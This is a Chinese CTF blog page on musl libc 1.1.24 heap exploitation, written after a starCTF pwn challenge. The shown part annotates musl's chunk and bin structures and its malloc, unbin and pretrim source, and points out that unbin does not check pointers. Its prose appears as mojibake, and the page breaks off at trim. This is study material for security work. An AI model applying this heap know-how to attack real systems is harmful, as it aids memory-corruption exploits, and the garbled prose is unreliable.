<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            musl 1.1.24åˆ©ç”¨æ–¹å¼ |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/ufo.ico">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","categories":"/categories","tags":"/tags"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"æµ…æµ…æ›´æ–°åšå®¢ä¸€ä¸‹å§~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"æ…¢æ…¢å¥½èµ·æ¥"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"æ¿€åŠ±ç‰›é©¬ï¼ŒåŠ é€Ÿåˆ›ä½œï¼","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®º"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/ling.JPG">
                </a>
            
            <a class="site-name border-box" href="/">
               196082&#39;s blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                é¦–é¡µ
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                å½’æ¡£
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                åˆ†ç±»
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                æ ‡ç­¾
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            é¦–é¡µ
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            å½’æ¡£
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                            åˆ†ç±»
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                            æ ‡ç­¾
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        musl 1.1.24åˆ©ç”¨æ–¹å¼
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/ling.JPG">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">196082</span>
                                
                                    <span class="author-badge">æ…¢æ…¢å¥½èµ·æ¥</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2022-04-27 20:35:56</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Mon May 09 2022 14:33:11 GMT+0800">2022-05-09 14:33:11</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/pwn/">pwn</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/musl/">musl</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.5k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>17 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>è¿™ä¸ªæœˆå¹²çš„æ˜¯å±å®æœ‰ç‚¹å„¿å°‘ï¼Œæ„Ÿè§‰ç‰¹åˆ«è¿·èŒ«ï¼Œå­¦äº†é‚£ä¹ˆå¤šç»“æœæ¯”èµ›è¿˜æ˜¯ä¸€å¤´é›¾æ°´ï¼Œè™½ç„¶å¾ˆçƒ¦èºä½†æ˜¯è¿˜æ˜¯ä¸èƒ½æ”¾å¼ƒå•Šï¼</p>
<p>åœ¨starCTFçš„ç¬¬äºŒé“é¢˜æˆ‘å§‹ç»ˆæ‰¾ä¸åˆ°æ¼æ´ç‚¹åœ¨å“ªï¼Œä¸‹æ¥çœ‹wpæ‰å‘ç°ä½¿ç”¨çš„libcä¸æ˜¯æ™®é€šçš„glibcäº†ï¼Œå…¶å®åœ¨RCTFçš„ä¸€é“é¢˜ç›®å°±æ˜¯åŸºäºmuslçš„ä½†æ˜¯æ— å¥ˆgithubçš„ä»“åº“å½“ä¸­å¹¶æ²¡æœ‰é¢˜ç›®çš„æºç æ‰€ä»¥æ²¡å»æ·±å…¥äº†è§£ï¼Œåœ¨starCTFè¿‡åä¹Ÿç®—æ˜¯äº†è§£ä¸€ä¸‹è¿™ä¸€ç›¸è¾ƒäºglicæ›´ä¸ºè½»é‡çš„libcäº†ã€‚</p>
<p>é¦–å…ˆæœ¬æ–‡å…ˆä»‹ç»ä¸€ä¸‹è¿™ä¸€libc</p>
<h2 id="musl-1-1-24"><a href="#musl-1-1-24" class="headerlink" title="musl 1.1.24"></a>musl 1.1.24</h2><p>musl libc æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºåµŒå…¥å¼ç³»ç»Ÿå¼€å‘çš„è½»é‡çº§ libc åº“ï¼Œä»¥ç®€å•ã€è½»é‡å’Œé«˜æ•ˆç‡ä¸ºç‰¹è‰²ã€‚æœ‰ä¸å°‘ Linux å‘è¡Œç‰ˆå°†å…¶è®¾ä¸ºé»˜è®¤çš„ libc åº“ï¼Œç”¨æ¥ä»£æ›¿ä½“ç§¯è‡ƒè‚¿çš„ glibc ï¼Œå¦‚ Alpine Linuxï¼ˆåšè¿‡ Docker é•œåƒçš„åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼‰ã€OpenWrtï¼ˆå¸¸ç”¨äºè·¯ç”±å™¨ï¼‰å’Œ Gentoo ç­‰ã€‚</p>
<h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><p>è¿™ä¸€ç‰ˆæœ¬çš„chunkç»“æ„å…¶å®æ˜¯å’Œglibcç›¸å·®ä¸å¤§çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>psizeå’Œcsizeå­—æ®µéƒ½æœ‰æ ‡å¿—ä½ï¼ˆglibc åªæœ‰sizeå­—æ®µæœ‰ï¼‰ï¼Œä½†åªæœ‰ä¸€ç§ä½äºæœ€ä½ä½çš„æ ‡å¿—ä½INUSEï¼ˆglibc æœ€ä½ä¸‰ä½éƒ½æœ‰æ ‡å¿—ä½ï¼‰ã€‚è‹¥è®¾ç½®INUSEæ ‡å¿—ä½ï¼ˆæœ€ä½ä½ä¸º1ï¼‰ï¼Œè¡¨ç¤º chunk æ­£åœ¨è¢«ä½¿ç”¨ï¼›è‹¥æ²¡æœ‰è®¾ç½®INUSEæ ‡å¿—ä½ï¼ˆæœ€ä½ä½ä¸º0ï¼‰ï¼Œè¡¨ç¤º chunk å·²ç»è¢«é‡Šæ”¾æˆ–è€…é€šè¿‡mmapåˆ†é…çš„ï¼Œéœ€è¦é€šè¿‡psizeçš„æ ‡å¿—ä½æ¥è¿›ä¸€æ­¥åˆ¤æ–­ chunk çš„çŠ¶æ€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªmalç»“æ„ä½“å¾ˆç±»ä¼¼main_arenaï¼Œé‡Œé¢è®°å½•ç€å †çš„ä¿¡æ¯ï¼Œæœ‰ä¸‰ä¸ªæˆå‘˜ï¼š64ä½æ— ç¬¦å·æ•´æ•°binmapã€é“¾è¡¨å¤´éƒ¨æ•°ç»„binså’Œé”free_lockã€‚binmapè®°å½•æ¯ä¸ª bin æ˜¯å¦ä¸ºéç©ºï¼Œè‹¥æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œè¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå³ bin é“¾è¡¨ä¸­æœ‰ chunkã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>bin é“¾è¡¨å¤´éƒ¨çš„ç»“æ„å¦‚ä¸Šã€‚headå’ŒtailæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘é¦–éƒ¨å’Œå°¾éƒ¨çš„ chunkï¼ŒåŒæ—¶é¦–éƒ¨ chunk çš„prevæŒ‡é’ˆå’Œå°¾éƒ¨ chunk çš„nextæŒ‡é’ˆæŒ‡å‘ bin é“¾è¡¨å¤´éƒ¨ï¼Œè¿™æ ·æ„æˆäº†å¾ªç¯é“¾è¡¨ã€‚å½“é“¾è¡¨ä¸ºç©ºæ—¶ï¼Œheadå’ŒtailæŒ‡é’ˆç­‰äº 0 æˆ–è€…æŒ‡å‘é“¾è¡¨å¤´éƒ¨è‡ªèº«ã€‚</p>
<p>çœ‹malç»“æ„å¯ä»¥çœ‹åˆ°æœ‰64çš„binï¼Œå‰é¢32ä¸ªbinæ˜¯ç±»ä¼¼äºsmall binçš„ç»“æ„ï¼Œå­˜æ”¾çš„chunkçš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åé¢çš„å°±ç±»ä¼¼äºlarge binå­˜æ”¾çš„æ˜¯åœ¨ä¸€å®šèŒƒå›´çš„chunkäº†ã€‚</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L284-L331</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. n å¢åŠ å¤´éƒ¨é•¿åº¦ OVERHEAD (0x10)ï¼Œå¯¹é½ 32 ä½ï¼š</span></span><br><span class="line">    <span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥ n åˆ°è¾¾ MMAP_THRESHOLD (0x38000)ï¼Œä½¿ç”¨ mmap chunk</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è®¡ç®— n å¯¹åº”çš„ bin ä¸‹æ ‡ i</span></span><br><span class="line">    i = bin_index_up(n);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 3. æŸ¥æ‰¾ binmap</span></span><br><span class="line">        <span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        <span class="comment">// è‹¥æ‰€æœ‰çš„å¯ç”¨ bin å‡ä¸ºç©ºï¼Œè°ƒç”¨ expand_heap å‡½æ•°å»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆæ–°çš„ chunk</span></span><br><span class="line">        <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">            c = expand_heap(n);</span><br><span class="line">            [...]</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. è·å–å¤§å°æœ€æ¥è¿‘ n çš„å¯ç”¨ bin ä¸‹æ ‡ j</span></span><br><span class="line">        j = first_set(mask);</span><br><span class="line">        lock_bin(j);</span><br><span class="line">        c = mal.bins[j].head; <span class="comment">// c æ˜¯ bin j é“¾è¡¨é¦–éƒ¨çš„ chunk</span></span><br><span class="line">        <span class="comment">// 5. è‹¥ç¬¦åˆæ¡ä»¶ï¼Œä½¿ç”¨ pretrim åˆ†å‰² cï¼Œå¦åˆ™ä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º c</span></span><br><span class="line">        <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">            unlock_bin(j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock_bin(j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. å›æ”¶ c ä¸­å¤§å°è¶…è¿‡ n çš„éƒ¨åˆ†</span></span><br><span class="line">    <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    trim(c, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚æ­¥éª¤å°±æ˜¯ï¼š</p>
<ol>
<li><p>è°ƒæ•´nï¼Œå¢åŠ å¤´éƒ¨çš„é•¿åº¦ç„¶åå¯¹é½32ä½</p>
</li>
<li><p>å¦‚æœn&gt;MMAP_THRESHOLDï¼Œåˆ™ä½¿ç”¨mmapåˆ›å»ºä¸€å—å¤§å°ä¸ºnçš„å†…å­˜è¿”å›</p>
</li>
<li><p>å¦‚æœn&lt;&#x3D;MMAP_THRESHOLDï¼Œè®¡ç®—nå¯¹åº”çš„binçš„iï¼ŒæŸ¥æ‰¾binmap</p>
<p>â€‹	å¦‚æœæ‰€æœ‰å¯ç”¨binéƒ½ä¸ºç©ºï¼Œé‚£ä¹ˆå°±æ‰©å±•å †ç©ºé—´ï¼Œç”Ÿå­˜ä¸€ä¸ªæ–°çš„chunk</p>
<p>â€‹	å¦‚æœå­˜åœ¨éç©ºçš„binï¼Œåˆ™å¤§å°æœ€æ¥è¿‘nçš„binï¼Œå°†biné¦–éƒ¨çš„chunkè¿”å›</p>
<p>â€‹		å¦‚æœç¬¦å·pretrimeæ¡ä»¶ï¼Œä½¿ç”¨pretrimeåˆ†å‰²</p>
<p>â€‹		å¦åˆ™ä½¿ç”¨unbinä»é“¾è¡¨ä¸­å–å‡º</p>
<p>â€‹	æœ€åå¯¹chunkè¿›è¡Œtrimï¼Œè¿”å›ç»™ç”¨æˆ·</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è‹¥ bin åªæœ‰ä¸€ä¸ª chunkï¼Œå°† bin è®¾ä¸ºç©º bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// å–å‡ºé“¾è¡¨ä¸­çš„ chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// è®¾ç½® INUSE æ ‡å¿—ä½</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å…¶å®å°±æ˜¯å–å‡ºchunkçš„ä¸€ä¸ªæ“ä½œï¼Œå¯ä»¥çœ‹åˆ°å–å‡ºçš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æ£€æµ‹chunkæŒ‡é’ˆçš„åˆæ³•æ€§ï¼Œè¿™ä¹Ÿå°±é€ æˆäº†å®‰å…¨éšæ‚£</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¡ä»¶ 1: bin j ä¸‹æ ‡å¤§äº 40</span></span><br><span class="line">    <span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// æ¡ä»¶ 2: bin j ä¸ i ç›¸éš” 3 ä¸ª bin æˆ–ä»¥ä¸Šï¼Œ</span></span><br><span class="line">    <span class="comment">// æˆ–è€… j ç­‰äº 63 ä¸” split çš„å¤§å°å¤§äº MMAP_THRESHOLD</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">        <span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ¡ä»¶ 3: split çš„å¤§å°å±äº bin j èŒƒå›´å†…ï¼Œå³ split ä¸ self å±äºåŒä¸€ä¸ª bin</span></span><br><span class="line">    <span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ‡å‰²å‡ºä¸€å—å¤§å°ä¸º n çš„ chunk</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;prev = self-&gt;prev;</span><br><span class="line">    split-&gt;next = self-&gt;next;</span><br><span class="line">    split-&gt;prev-&gt;next = split;</span><br><span class="line">    split-&gt;next-&gt;prev = split;</span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n;</span><br><span class="line">    next-&gt;psize = n1-n;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pretrimçš„ä½œç”¨æ˜¯åˆ‡å‰²å¤§ chunkï¼Œé˜²æ­¢æŠŠå¤§å°è¶…è¿‡éœ€æ±‚çš„ chunk åˆ†é…ç»™ç”¨æˆ·ã€‚å½“æ»¡è¶³ä¸€å®šæ¡ä»¶æ—¶ï¼Œpretrimä» bin é“¾è¡¨é¦–éƒ¨ chunk åˆ‡å‰²å‡ºä¸€å—å¤§å°åˆšå¥½ç¬¦åˆéœ€æ±‚çš„å° chunkï¼Œç„¶åå°†å° chunk åˆ†é…ç»™ç”¨æˆ·ï¼Œé“¾è¡¨é¦–éƒ¨ chunk çš„ä½ç½®ä¿æŒä¸å˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span 